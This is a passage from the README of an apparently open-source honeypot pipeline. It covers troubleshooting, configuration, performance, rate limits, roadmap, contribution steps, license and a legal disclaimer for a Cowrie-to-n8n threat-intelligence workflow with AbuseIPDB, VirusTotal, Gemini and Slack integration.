   - Click execution to view flow

4. **Verify Complete Pipeline**:
   - Check Google Sheets for new row
   - Check Slack for alert message
   - Verify AbuseIPDB score populated
   - Verify AI analysis generated

#### Troubleshooting

**No Webhook Triggers**:
```bash
# Check Logstash output
sudo tail -f /var/log/logstash/logstash-plain.log

# Test webhook manually
curl -X POST http://your-n8n:5678/webhook/honeypot_logs \
  -H "Content-Type: application/json" \
  -d '{"body":{"src_ip":"1.2.3.4","commands_list":["test"]}}'
```

**AbuseIPDB Errors**:
```bash
# Verify API key
curl -G https://api.abuseipdb.com/api/v2/check \
  -H "Key: YOUR_API_KEY" \
  --data-urlencode "ipAddress=1.2.3.4"
```

**Gemini Errors**:
```bash
# Test Gemini CLI
gemini gemini-2.5-pro "Test prompt"

# Check API key
echo $GOOGLE_API_KEY
```

---

## 🔧 Advanced Configuration

### Custom AI Prompts

Edit the `AI Threat Analysis` SSH node to customize output:

```bash
PROMPT=$(cat <<'EOF'
You are a [CUSTOM PERSONA].

<analysis_rules>
1. Focus on [CUSTOM CRITERIA]
2. Include [CUSTOM FIELDS]
3. Output format: [CUSTOM FORMAT]
</analysis_rules>

[CUSTOM OUTPUT TEMPLATE]
EOF
)
```

### Adjusting IP Blocking Threshold

Modify the `Check Abuse Score` node condition:

```javascript
// Current: 80% threshold
if (abuseScore > 80) { block(); }

// More aggressive: 60% threshold
if (abuseScore > 60) { block(); }

// Conservative: 90% threshold
if (abuseScore > 90) { block(); }
```

## 📈 Performance & Scaling

### Resource Utilization

**Baseline Metrics** (single honeypot, 100 attacks/day):
- **Filebeat**: 50MB RAM, <5% CPU
- **Logstash**: 1GB RAM (aggregate filter), 10-20% CPU
- **n8n**: 200-500MB RAM, 5-15% CPU (spikes during AI analysis)
- **Total**: ~2GB RAM, ~30% CPU usage on 2-core system

**High-Traffic Metrics** (10 honeypots, 1000 attacks/day):
- **Logstash**: 2-3GB RAM (increase heap size: `Xms2g -Xmx3g`)
- **n8n**: 1GB RAM (enable worker threads)
- **Recommended**: 4 vCPU, 8GB RAM

### Latency Breakdown

**Average End-to-End Processing Time**: 10-15 seconds

| Stage | Latency | Notes |
|-------|---------|-------|
| Cowrie → Filebeat | 1-5s | Configurable: `scan_frequency: 10s` |
| Filebeat → Logstash | <1s | Near real-time |
| Logstash Aggregation | 0-600s | Waits for session close or timeout |
| Logstash → n8n Webhook | <2s | HTTP POST |
| n8n: Parse Data | <100ms | JavaScript execution |
| n8n: AbuseIPDB API | 300-800ms | Network round-trip |
| n8n: URL Extraction | <100ms | Regex processing |
| n8n: VirusTotal API | 1-3s | API processing time |
| n8n: Gemini AI Analysis | 20s | Model inference |
| n8n: Google Sheets Log | 500ms-1s | API write |
| n8n: Slack Alert | 300-800ms | API POST |

**Optimization Strategies**:
- **Reduce Logstash timeout**: Lower from 600s to 300s for faster triggers
- **Parallel API calls**: Use n8n's `Wait` node to run AbuseIPDB and URL extraction concurrently
- **Cache VirusTotal results**: Skip re-scanning known URLs (requires Redis)
- **Batch Slack alerts**: Group multiple low-severity events into digest messages

### API Rate Limits

**AbuseIPDB** (Free Tier):
- **Limit**: 1000 requests/day
- **Burst**: No limit
- **Solution**: For >1000 attacks/day, implement caching or upgrade to paid tier

**VirusTotal** (Free Tier):
- **Limit**: 4 requests/minute, 500/day
- **Burst**: No burst allowance
- **Solution**: Implement request queue in n8n:
  ```javascript
  // Add delay between scans
  const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
  await delay(15000); // 15-second delay = 4 req/min
  ```

**Google Gemini** (Free Tier):
- **Limit**: 15 requests/minute, 1500/day
- **Solution**: Batch analysis or upgrade to paid tier for high-volume deployments

**Slack** (Free Tier):
- **Limit**: 1 message/second per channel
- **Solution**: Use `rate_limit` node in n8n to throttle alerts

---

## 🛡️Data Privacy

**GDPR Considerations**:
- IP addresses are considered personal data under GDPR
- Implement data retention policy (e.g., delete logs after 90 days)
- Add privacy policy to Slack notifications

---

## 📊 Metrics & Monitoring

### Key Performance Indicators

**Threat Intelligence Metrics**:
- **Top Attacking Countries**: Group by `COUNTRY` field
- **Top Malware Families**: Group by `MALWARE_FAMILY`
- **MITRE Tactic Distribution**: Categorize attacks by ATT&CK framework
- **Severity Score Distribution**: Histogram of 0-100 scores

### Monitoring Dashboard (Google Sheets)

**Create Pivot Tables**:

1. **Attacks by Country**:
   - Rows: `COUNTRY`
   - Values: `COUNT of ATTACKER_IP`
   - Sort: Descending

2. **Malware Families**:
   - Rows: `MALWARE_FAMILY`
   - Values: `COUNT of ATTACKER_IP`
   - Filter: `MALWARE_FAMILY` is not empty

3. **Severity Trends**:
   - Rows: `TIMESTAMP` (grouped by week)
   - Values: `AVERAGE of SEVERITY_SCORE`
   - Chart: Line graph

---

## 🔮 Roadmap & Future Enhancements

### Planned Features

- **Automated Dynamic Analysis**: Integration with sandboxing tools (Cuckoo/CAPE) for automatic binary detonation and behavioral report generation.
- **Extended Honeypot Support**: Support for HTTP/HTTPS handlers (T-Pot, Dionaea) to capture web-based attacks.
- **Graph Database Correlation**: Neo4j integration for visual mapping of attacker infrastructure and botnet clusters.
- **Automated CTI Reporting**: STIX/TAXII feed generation for standardized IOC sharing with the community.
- **Advanced Active Defense**: Expanded library of response playbooks (e.g., Domain Sinkholing, Cloudflare WAF blocking).
- **Real-Time Threat Hunting**: Sigma rule integration for proactive detection of novel attack patterns.
- **Threat Actor Profiling**: Long-term behavioral fingerprinting to track persistent adversaries across campaigns.

### Contributing

We welcome contributions from the security community!

**Areas for Contribution**:
- **AI Prompt Engineering**: Improve Gemini analysis prompts for better accuracy
- **MITRE ATT&CK Mapping**: Expand tactic/technique coverage
- **Honeypot Integrations**: Add support for new honeypot types
- **Visualization**: Build Grafana/Kibana dashboards
- **Documentation**: Improve installation guides, troubleshooting

**How to Contribute**:
1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-improvement`)
3. Commit your changes (`git commit -m 'Add amazing improvement'`)
4. Push to the branch (`git push origin feature/amazing-improvement`)
5. Open a Pull Request

**Development Setup**:
```bash
# Clone repository
git clone https://github.com/Khimira/honeypot-sentinel.git
cd honeypot-sentinel

# Install pre-commit hooks
pip install pre-commit
pre-commit install

```

---

## 📄 License

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.

**Permissions**:
- ✅ Commercial use
- ✅ Modification
- ✅ Distribution
- ✅ Private use

**Limitations**:
- ❌ Liability
- ❌ Warranty

---

## 🙏 Acknowledgments

This project builds on the work of numerous open-source communities:

- **[Cowrie Honeypot](https://github.com/cowrie/cowrie)** - Michel Oosterhof and contributors
- **[n8n](https://n8n.io)** - Jan Oberhauser and the n8n team
- **[Elastic Stack](https://www.elastic.co)** - Elasticsearch, Filebeat, Logstash
- **[AbuseIPDB](https://www.abuseipdb.com)** - Community-driven IP reputation database
- **[VirusTotal](https://www.virustotal.com)** - Google's malware intelligence platform
- **[Google Gemini](https://ai.google.dev)** - Google's Advanced AI language models
- **[MITRE ATT&CK](https://attack.mitre.org)** - Adversary tactics and techniques framework

Special thanks to the global cybersecurity community for sharing threat intelligence and best practices.

---

## 📧 Support & Contact

### Getting Help

- **GitHub Issues**: [github.com/Khimira/honeypot-sentinel/issues](https://github.com/Khimira/honeypot-sentinel/issues)
- **Email**: khimira.dev@gmail.com

---

## ⚠️ Disclaimer

**LEGAL NOTICE**: This tool is intended for **legitimate security research and monitoring purposes only**. Users are responsible for compliance with all applicable laws and regulations, including:

- **Computer Fraud and Abuse Act (CFAA)** in the United States
- **Computer Misuse Act** in the United Kingdom
- **General Data Protection Regulation (GDPR)** in the European Union
- **Lei Geral de Proteção de Dados** in Brazil
- Local data protection and cybersecurity laws

**The authors assume no liability for**:
- Misuse of this software for illegal activities
- Damage caused by automated IP blocking (ensure proper testing)
- False positives resulting in legitimate traffic being blocked
- Data breaches or unauthorized access to honeypot infrastructure
- Violations of terms of service for third-party APIs

**USE AT YOUR OWN RISK**. Always obtain proper authorization before deploying honeypots or conducting security research on networks you do not own.

---

## 📊 Statistics


---

**Built with ❤️ for the cybersecurity community. Stay vigilant. Stay secure.**
